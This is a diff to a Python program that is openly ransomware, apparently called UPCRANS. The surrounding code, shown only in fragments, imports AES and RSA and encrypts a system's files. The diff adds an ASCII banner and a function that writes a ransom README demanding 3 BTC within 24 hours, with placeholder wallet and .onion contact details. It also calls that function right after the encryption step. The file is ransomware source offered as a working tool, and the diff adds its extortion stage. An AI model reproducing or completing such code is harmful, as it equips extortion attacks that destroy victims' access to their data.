@@ -1,3 +1,14 @@
+#    @@@  @@@  @@@@@@@    @@@@@@@  @@@@@@@    @@@@@@   @@@  @@@   @@@@@@    #  
+#    @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@    #    
+#    @@!  @@@  @@!  @@@  !@@       @@!  @@@  @@!  @@@  @@!@!@@@  !@@        #       
+#    !@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!  @!@  !@!!@!@!  !@!        #     
+#    @!@  !@!  @!@@!@!   !@!       @!@!!@!   @!@!@!@!  @!@ !!@!  !!@@!!     #    
+#    !@!  !!!  !!@!!!    !!!       !!@!@!    !!!@!!!!  !@!  !!!   !!@!!!    #   
+#    !!:  !!!  !!:       :!!       !!: :!!   !!:  !!!  !!:  !!!       !:!   #   
+#    :!:  !:!  :!:       :!:       :!:  !:!  :!:  !:!  :!:  !:!      !:!    #   
+#    ::::: ::   ::        ::: :::  ::   :::  ::   :::   ::   ::  :::: ::    #   
+#    : :  :    :         :: :: :   :   : :   :   : :  ::    :   :: : :      # 
+
 from Crypto import Random
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
@@ -23,6 +34,34 @@ def parse_args():
                         action='store_true')
 
     return parser.parse_args()
+
+
+def create_Readme():
+    text = '''                                                              
+    @@@  @@@  @@@@@@@    @@@@@@@  @@@@@@@    @@@@@@   @@@  @@@   @@@@@@   
+    @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@   
+    @@!  @@@  @@!  @@@  !@@       @@!  @@@  @@!  @@@  @@!@!@@@  !@@       
+    !@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!  @!@  !@!!@!@!  !@!       
+    @!@  !@!  @!@@!@!   !@!       @!@!!@!   @!@!@!@!  @!@ !!@!  !!@@!!    
+    !@!  !!!  !!@!!!    !!!       !!@!@!    !!!@!!!!  !@!  !!!   !!@!!!   
+    !!:  !!!  !!:       :!!       !!: :!!   !!:  !!!  !!:  !!!       !:!  
+    :!:  !:!  :!:       :!:       :!:  !:!  :!:  !:!  :!:  !:!      !:!   
+    ::::: ::   ::        ::: :::  ::   :::  ::   :::   ::   ::  :::: ::   
+    : :  :    :         :: :: :   :   : :   :   : :  ::    :   :: : :    
+                                                                        
+    Sadly your computer has been infected and all your files have been encrypted.
+    If you want to recover all your data, you have 24 hours to pay 3 BTC in the following wallet:
+    aweuioxjvsjdñroj3084u
+
+    In addition, you can talk with us in this chat: xxxxxxxxxx.onion
+
+    With our deepest regret,
+    ~UPCRANS team~  
+    '''
+
+    with open('README.txt', 'w') as fo:
+                fo.write(text)
+    return 
 
 
 #Initialize both AES and RSA keys and store in class_keys
@@ -159,6 +198,7 @@ def main():
     if args.encryption == True:
         #Encrypt files of your system
         encrypt_file(l_files, keys.AESkey)
+        create_Readme()
 
     elif args.decryption == True:
         #Decrypt the encrypted files of your system
